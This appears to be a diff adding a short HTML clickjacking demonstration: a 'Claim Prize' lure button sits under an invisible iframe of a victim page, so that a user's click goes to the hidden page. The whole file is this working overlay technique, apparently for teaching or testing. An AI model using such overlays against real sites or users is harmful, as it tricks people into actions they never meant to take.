@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Clickjacking Demo</title>
+  <style>
+    iframe {
+      position: absolute;
+      top: 60px; left: 60px;
+      width: 200px; height: 50px;
+      opacity: 0;   /* invisible but clickable */
+    }
+  </style>
+</head>
+<body>
+  <h2>🎁 Click here to claim your prize!</h2>
+  <button style="width:200px;height:50px;">Claim Prize</button>
+
+  <!-- Invisible victim page over button -->
+  <iframe src="v.html"></iframe>
+</body>
+</html>
